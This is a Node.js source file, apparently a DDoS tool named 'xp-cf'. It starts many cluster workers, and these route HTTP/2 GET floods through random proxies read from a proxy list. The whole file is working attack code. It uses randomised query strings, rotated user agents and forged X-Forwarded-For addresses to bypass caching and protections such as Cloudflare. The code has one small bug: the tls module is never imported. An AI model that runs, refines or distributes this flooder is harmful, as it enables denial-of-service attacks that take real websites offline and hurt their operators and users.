// methods xp-cf by @Dimzxzzx

const cluster = require('cluster');
const http2 = require('http2');
const fs = require('fs');
const url = require('url');
const { Worker, isMainThread } = require('worker_threads');
const UserAgent = require('user-agents');

const target = process.argv[2]; 
const time = parseInt(process.argv[3]); 
const threadCount = parseInt(process.argv[4]) || 20;
const reqPerConn = parseInt(process.argv[5]) || 100;
const proxyList = fs.readFileSync('proxy.txt', 'utf-8').toString().split('\n').filter(Boolean);

if (!target || !time) {
    console.log("Usage: node xp-cf.js <target> <time> <threads> <rate>");
    process.exit(1);
}

const parsed = url.parse(target);

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function randomProxy() {
    const raw = proxyList[Math.floor(Math.random() * proxyList.length)];
    const [ip, port] = raw.split(':');
    return { ip, port: parseInt(port) };
}

function attack() {
    const proxy = randomProxy();
    const userAgent = new UserAgent().toString();

    const reqOptions = {
        host: proxy.ip,
        port: proxy.port,
        method: 'CONNECT',
        path: parsed.host + ':443',
    };

    const req = require('http').request(reqOptions);
    req.on('connect', (res, socket) => {
        const client = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                socket,
                servername: parsed.host,
                ALPNProtocols: ['h2'],
                rejectUnauthorized: false,
            }),
        });

        client.on('error', () => {});

        for (let i = 0; i < reqPerConn; i++) {
            const path = parsed.path + (parsed.path.includes('?') ? '&' : '?') + Math.random().toString(36).substring(7);

            const headers = {
                ':method': 'GET',
                ':path': path,
                ':scheme': 'https',
                ':authority': parsed.host,
                'user-agent': userAgent,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'x-forwarded-for': `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`
            };

            const req = client.request(headers);
            req.on('response', () => {
                req.close();
            });
            req.end();
        }
    });
    req.on('error', () => {});
    req.end();
}

if (cluster.isMaster) {
    console.log(`🛰 Start Flood -> ${target}`);
    console.log(`Threads : ${threadCount}, RPS per thread : ${reqPerConn}`);
    for (let i = 0; i < threadCount; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    setInterval(attack);
}